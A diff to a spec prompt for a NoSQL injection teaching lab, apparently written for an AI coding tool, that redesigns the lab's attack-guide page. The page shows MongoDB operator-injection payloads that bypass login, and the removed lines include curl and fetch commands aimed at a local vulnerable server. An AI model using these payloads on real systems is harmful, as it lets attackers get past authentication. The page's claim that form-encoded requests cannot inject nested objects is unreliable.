@@ -1,5 +1,19 @@
 # Cursor Prompt: NoSQL Injection Demo — DevAuth
 
+## Global UI Standard — applies to every server in this lab
+
+| Server type | Theme |
+|-------------|-------|
+| Attacker server / Attack guide | Clone `DASHBOARD_HTML` from `reverse-tabnabbing/attacker-server.js` — `#0a0a0a` bg, `#00ff41` text, `'Courier New'` font. Copy `<style>` verbatim. |
+| Internal / target server (e.g. SSRF port 3020) | Muted corporate — `#1a1a2e` bg, `#e2e8f0` text |
+| Victim servers | Realistic product UI matching their brand |
+
+**Attacker/guide pages — non-negotiable rules:**
+- Copy the `<style>` block from `DASHBOARD_HTML` in `reverse-tabnabbing/attacker-server.js` **verbatim**. Never recreate or paraphrase it.
+- Body layout: `padding: 2rem` on body. No max-width wrapper div. No centering.
+- Panels: use `.flow-box` and `.credentials-panel` classes (defined in that style block).
+- Navigation: **fixed bottom-left `target-switcher` only.** No other open/link buttons anywhere on the page.
+
 ## Context
 
 Part of the security attack demonstration lab at
@@ -313,89 +327,100 @@ All other routes (GET /logout, GET /dashboard) identical to port 3022.
 
 ## Port 3023 — Attack Guide Server
 
-Style: same dark navy as the demo servers. Monospace. Muted corporate, not
-hacker-terminal. Max-width 800px content area, centered.
+### UI — MANDATORY: clone from reverse-tabnabbing dashboard
 
-**`GET /`**
+Open `demo-attacked/reverse-tabnabbing/attacker-server.js`. Find the
+`DASHBOARD_HTML` constant. Copy its entire `<style>` block **verbatim** — every
+rule, every value, character for character — into this page's `<style>`. Do not
+reinterpret or recreate any CSS. Also copy `SWITCHER_CSS` verbatim.
 
-Header:
+Body layout: no wrapper div, no max-width centering. The body itself has
+`padding: 2rem` — same as the tabnabbing dashboard. Panels use `.flow-box` and
+`.credentials-panel` classes exactly as the tabnabbing dashboard uses them.
+
+**Navigation — fixed bottom-left switcher ONLY.** There must be no other
+"open victim" / "open protected" buttons anywhere on the page.
+
+```html
+<div class="target-switcher">
+  <button class="btn-vulnerable" id="btn-switcher-vulnerable">Vulnerable (:3022)</button>
+  <button class="btn-protected" id="btn-switcher-protected">Protected (:3024)</button>
+</div>
 ```
-NoSQL Injection — Attack Guide
-How operator injection bypasses MongoDB authentication
-```
 
-**Section 1: HOW MONGODB LOGIN QUERIES WORK**
-
-Code block:
+Switcher JS:
 ```js
-// Normal login — what the developer intended
+document.getElementById('btn-switcher-vulnerable').addEventListener('click', function () {
+  window.open('http://localhost:3022/login', '_blank');
+});
+document.getElementById('btn-switcher-protected').addEventListener('click', function () {
+  window.open('http://localhost:3024/login', '_blank');
+});
+```
+
+### `GET /` — page content
+
+```html
+<body>
+  <h1>NoSQL Injection — Attack Guide</h1>
+  <p class="subtitle">How operator injection bypasses MongoDB authentication</p>
+
+  <div class="flow-box" style="max-width:900px">
+    <strong>HOW MONGODB LOGIN QUERIES WORK</strong><br><br>
+    <pre>// Normal login — what the developer intended
 db.users.findOne({ username: "alice", password: "hunter2" })
-// → returns user object only if both fields match exactly
-```
+// → returns user object only if both fields match exactly</pre>
+  </div>
 
-**Section 2: THE INJECTION**
-
-Code block:
-```js
-// What the attacker sends (HTTP request body):
+  <div class="flow-box" style="max-width:900px">
+    <strong>THE INJECTION</strong><br><br>
+    <pre>// What the attacker sends (HTTP request body):
 { "username": "admin", "password": { "$gt": "" } }
 
 // What Express parses and the server builds:
 db.users.findOne({ username: "admin", password: { $gt: "" } })
 // → "$gt": "" means "password greater than empty string"
 // → any non-empty password satisfies this — admin is returned
-// → attacker is logged in without knowing the password
+// → attacker is logged in without knowing the password</pre>
+  </div>
+
+  <div class="credentials-panel">
+    <h2>Other Operators That Work</h2>
+    <table>
+      <thead><tr><th>Payload</th><th>Effect</th></tr></thead>
+      <tbody>
+        <tr><td><code>{ "$gt": "" }</code></td><td>Greater than empty string — matches any non-empty password</td></tr>
+        <tr><td><code>{ "$ne": "x" }</code></td><td>Not equal to "x" — matches any password except "x"</td></tr>
+        <tr><td><code>{ "$regex": ".*" }</code></td><td>Regex match-all — matches anything</td></tr>
+        <tr><td><code>{ "$exists": true }</code></td><td>Field exists — matches any user with a password field</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="credentials-panel" style="margin-top:2rem">
+    <h2>Copy Payloads</h2>
+    <!-- payload-box: label + pre#curl-payload + copy button -->
+    <!-- payload-box: label + pre#fetch-payload + copy button -->
+    <!-- use existing CURL_PAYLOAD and FETCH_PAYLOAD constants -->
+  </div>
+
+  <div class="credentials-panel" style="margin-top:2rem">
+    <h2>Why JSON Endpoints Are Specifically Vulnerable</h2>
+    <p style="font-size:0.85rem;color:#94a3b8;line-height:1.7;max-width:640px">
+      This attack only works because the endpoint accepts JSON
+      (Content-Type: application/json) and express.json() parses nested objects.
+      A form-encoded endpoint (application/x-www-form-urlencoded) cannot send a
+      nested object — password[$gt]= arrives as the literal string "$gt=".
+      JSON is required for object injection.<br><br>
+      SQL injection does not have this limitation — it works on any string input.
+      That is why SQL and NoSQL injection have different but equally dangerous
+      attack surfaces.
+    </p>
+  </div>
+
+  <!-- fixed bottom-left switcher — see above -->
+</body>
 ```
-
-**Section 3: OTHER OPERATORS THAT WORK**
-
-Table:
-
-| Payload | Effect |
-|---------|--------|
-| `{ "$gt": "" }` | Greater than empty string — matches any non-empty password |
-| `{ "$ne": "x" }` | Not equal to "x" — matches any password except "x" |
-| `{ "$regex": ".*" }` | Regex match-all — matches anything |
-| `{ "$exists": true }` | Field exists — matches any user with a password field |
-
-**Section 4: COPY PAYLOADS**
-
-Two boxes with copy buttons:
-
-Box 1 — curl (login bypass):
-```
-curl -s -X POST http://localhost:3022/login \
-  -H 'Content-Type: application/json' \
-  -d '{"username":"admin","password":{"$gt":""}}' \
-  -L
-```
-
-Box 2 — browser console fetch:
-```
-fetch('http://localhost:3022/login', {
-  method: 'POST',
-  headers: { 'Content-Type': 'application/json' },
-  body: JSON.stringify({ username: 'admin', password: { $gt: '' } })
-}).then(r => console.log('Redirected to:', r.url))
-```
-
-**Section 5: WHY JSON ENDPOINTS ARE SPECIFICALLY VULNERABLE**
-
-Prose paragraph:
-```
-This attack only works because the endpoint accepts JSON
-(Content-Type: application/json) and express.json() parses nested objects.
-A form-encoded endpoint (application/x-www-form-urlencoded) cannot send a
-nested object — password[$gt]= arrives as the literal string "$gt=".
-JSON is required for object injection.
-
-SQL injection does not have this limitation — it works on any string input.
-That is why SQL and NoSQL injection have different but equally dangerous
-attack surfaces.
-```
-
-**Bottom:** two small buttons — `Vulnerable DevAuth :3022` (opens in new tab)
-and `Protected DevAuth :3024` (opens in new tab).
 
 ---
 
